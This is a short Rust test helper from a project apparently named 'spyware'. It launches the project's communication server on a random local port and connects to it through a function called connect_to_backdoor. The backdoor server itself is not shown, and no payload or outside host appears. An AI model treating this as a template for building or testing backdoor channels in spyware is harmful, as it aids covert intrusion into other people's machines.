use rand::Rng;
use spyware::communication;
use std::io::Error;
use std::net::TcpStream;
use std::thread;

const MIN_PORT_VALUE: u16 = 1024;
const MAX_PORT_VALUE: u16 = 65535;
const LOOPBACK_IP: &str = "127.0.0.1";

pub fn connect_to_backdoor(addr: &str) -> Result<TcpStream, Error> {
    match TcpStream::connect(addr) {
        Ok(stream) => {
            println!("Successfully connected to backdoor at address {}", addr);
            Ok(stream)
        }
        Err(e) => {
            println!("Failed to connect to backdoor: {}", e);
            Err(e)
        }
    }
}

pub fn run_server_and_connect() -> Result<TcpStream, Error> {
    let port = rand::thread_rng().gen_range(MIN_PORT_VALUE, MAX_PORT_VALUE);
    // Test will fail on panic if run_server or connect_to_backdoor fails
    thread::spawn(move || communication::server::run_server(port).unwrap());
    let hundred_millis = std::time::Duration::from_millis(100);
    thread::sleep(hundred_millis);
    let stream = connect_to_backdoor(&format!("{}:{}", LOOPBACK_IP, port))?;
    return Ok(stream);
}
